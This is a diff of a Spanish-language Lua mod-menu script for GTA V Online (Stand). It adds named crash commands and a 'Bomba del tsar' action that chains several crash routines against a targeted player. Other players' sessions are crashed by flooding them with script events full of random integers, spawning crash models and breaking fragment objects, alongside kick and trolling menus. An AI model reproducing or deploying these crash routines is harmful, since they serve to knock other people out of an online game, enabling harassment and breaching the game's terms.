@@ -10,7 +10,7 @@ util.require_natives(1663599433)
 util.toast("Bienvenide Al Script!!")
 util.toast("Cargando, espere... (1-2s)")
 local response = false
-local localVer = 2.8
+local localVer = 2.9
 async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
     currentVer = tonumber(output)
     response = true
@@ -639,7 +639,7 @@ players.on_join(function(player_id)
 	--	menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(pid))
 	--end)
 
-    menu.action(crashes, "Modelo V1", {""}, "Funcando (Menus populares - Stand)", function()
+    menu.action(crashes, "Modelo V1", {"crashv1"}, "Funcando (Menus populares - Stand)", function()
         local mdl = util.joaat('a_c_poodle')
         BlockSyncs(player_id, function()
             if request_model(mdl, 2) then
@@ -664,11 +664,11 @@ players.on_join(function(player_id)
         end)
     end)
 
-    --menu.action(crashes, "Modelo V2", {""}, "", function()
+    --menu.action(crashes, "Test", {""}, "", function()
     --    local user = players.user()
     --    local user_ped = players.user_ped()
     --    local pos = players.get_position(user)
-    --    BlockSyncs(pid, function() 
+    --    BlockSyncs(player_id, function() 
     --        util.yield(100)
     --        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
     --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
@@ -689,7 +689,7 @@ players.on_join(function(player_id)
 
     menu.divider(crashes, "(Ryze Exclusivo)")
 
-    menu.action(crashes, "Inbloqueable", {}, "Funcando (Menus populares - Stand)", function()
+    menu.action(crashes, "Inbloqueable", {"crashv2"}, "Funcando (Menus populares - Stand)", function()
         for i = 1, 150 do
             util.trigger_script_event(1 << player_id, {0xA4D43510, player_id, 0xDF607FCD, math.random(int_min, int_max), math.random(int_min, int_max), 
             math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
@@ -697,7 +697,7 @@ players.on_join(function(player_id)
         end
     end)
 
-    menu.action(crashes, "Inbloqueable V2", {}, "Funcando (Menus populares - Stand)", function()
+    menu.action(crashes, "Inbloqueable V2", {"crashv3"}, "Funcando (Menus populares - Stand)", function()
         local int_min = -2147483647
         local int_max = 2147483647
         for i = 1, 150 do
@@ -747,7 +747,7 @@ players.on_join(function(player_id)
     --    end)
     --end)
 
-    menu.action(crashes, "Inbloqueable V4 '2T1'", {""}, "", function()
+    menu.action(crashes, "Inbloqueable V3 '2T1'", {"crashv4"}, "", function()
         BlockSyncs(player_id, function()
             local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
@@ -755,6 +755,39 @@ players.on_join(function(player_id)
             entities.delete_by_handle(object)
         end)
     end)
+
+    menu.divider(crashes, "(Potentes)")
+
+    menu.action(crashes, "Bomba del tsar", {"tsarbomba"}, "Crash demandante de pc, si no tienes buena pc no te recomiendo usarlo", function()
+        local objective = player_id
+        menu.trigger_commands("anticrashcamera on")
+        util.toast("Iniciando...")
+        util.yield(2000)
+        menu.trigger_commands("crashv1"..players.get_name(player_id))
+        menu.trigger_commands("crashv2"..players.get_name(player_id))
+        menu.trigger_commands("crashv3"..players.get_name(player_id))
+        menu.trigger_commands("crashv4"..players.get_name(player_id))
+        util.yield(2000)
+        menu.trigger_commands("crash"..players.get_name(player_id))
+        menu.trigger_commands("ngcrash"..players.get_name(player_id))
+        menu.trigger_commands("footlettuce"..players.get_name(player_id))
+        util.yield(1500)
+        util.toast("Espera en lo que se limpia todo...")
+        util.yield(8000)
+        menu.trigger_commands("anticrashcamera off")
+    end)
+    
+    -- Structure premade for the next crash
+
+
+    --menu.action(crashes, "Test", {}, "", function()
+        --BlockSyncs(player_id, function()
+        
+        --end)
+    
+    
+    
+    --end)
 
     local kicks = menu.list(malicious, "Kicks", {}, "")
 
@@ -875,9 +908,6 @@ players.on_join(function(player_id)
             util.toast(players.get_name(player_id).. " No esta en un coche")
         end
     end)
-
-    menu.divider(crashes, "Luego agregare mas.")
-
 
     menu.action(trolling, "Enviar Al Bote", {}, "", function()
         local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
@@ -1516,32 +1546,8 @@ players.on_join(function(player_id)
         end
     end)
 
-    menu.toggle_loop(friendly, "Dar vida", {"drophealth"}, "", function(toggle)
-        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
-        local pos = ENTITY.GET_ENTITY_COORDS(p)
-        STREAMING.REQUEST_MODEL(health)
-        while not STREAMING.HAS_MODEL_LOADED(health) do
-            STREAMING.REQUEST_MODEL(health)
-            util.yield()
-        end
-        OBJECT.CREATE_AMBIENT_PICKUP(healthpickup, pos.x, pos.y, pos.z, 0, false, health, true, false) --spawn health
-        if not STREAMING.HAS_MODEL_LOADED(health) then
-            util.toast("No se pudo cargar el modelo")
-        end
-    end)
-
-    menu.toggle_loop(friendly, "Dar armadura", {"droparmor"}, "", function(toggle)
-        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
-        local pos = ENTITY.GET_ENTITY_COORDS(p)
-        STREAMING.REQUEST_MODEL(armor)
-        while not STREAMING.HAS_MODEL_LOADED(armor) do
-            STREAMING.REQUEST_MODEL(armor)
-            util.yield()
-        end
-        OBJECT.CREATE_AMBIENT_PICKUP(armorpickup, pos.x, pos.y, pos.z, 0, false, armor, true, false) --spawn armor
-        if not STREAMING.HAS_MODEL_LOADED(armor) then
-            util.toast("No se pudo cargar el modelo")
-        end
+    menu.action(friendly, "Dar vida y armadura", {}, "", function()
+        menu.trigger_commands("autoheal"..players.get_name(player_id))
     end)
 
     menu.action(friendly, "Ganar daño criminal", {}, "Haslos ganar el desafio siempre", function()
@@ -2085,11 +2091,15 @@ menu.toggle(protects, "Modo Panico", {"panic"}, "Esto renderiza un modo de anti-
     local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
     if on_toggle then
         menu.trigger_commands("desyncall on")
+        menu.trigger_commands("potatomode on")
+        menu.trigger_commands("trafficpotato on")
         menu.trigger_command(BlockIncSyncs)
         menu.trigger_command(BlockNetEvents)
         menu.trigger_commands("anticrashcamera on")
     else
         menu.trigger_commands("desyncall off")
+        menu.trigger_commands("potatomode off")
+        menu.trigger_commands("trafficpotato off")
         menu.trigger_command(UnblockIncSyncs)
         menu.trigger_command(UnblockNetEvents)
         menu.trigger_commands("anticrashcamera off")
@@ -2710,12 +2720,12 @@ end)
 --end)
 
 
---local randomizer = function(x)
---    local r = math.random(1,3)
---    return x[r]
---end
+local randomizer = function(x)
+    local r = math.random(1,3)
+    return x[r]
+end
 
---array = {"1","1","2"}
+array = {"1","1","2"}
 
 menu.action(fun, "Jalar el gatillo", {}, "Juega la ruleta rusa con tu juego", function()
     if randomizer(array) == "1" then
@@ -2941,6 +2951,8 @@ end)
 menu.action(credits, "Aaron", {}, "Thanks for helping me with my first steps in the stand lua api", function()
 end)
 menu.action(credits, "Cxbr", {}, "Thx for friendly features <3", function()
+end)
+menu.action(credits, "Sapphire", {}, "Who helped me with almost every single feature and being patient because of my dumb brain <3", function()
 end)
 menu.action(credits, "Ustedes", {}, "Who download the script and give ideas for improvement <3", function()
 end)
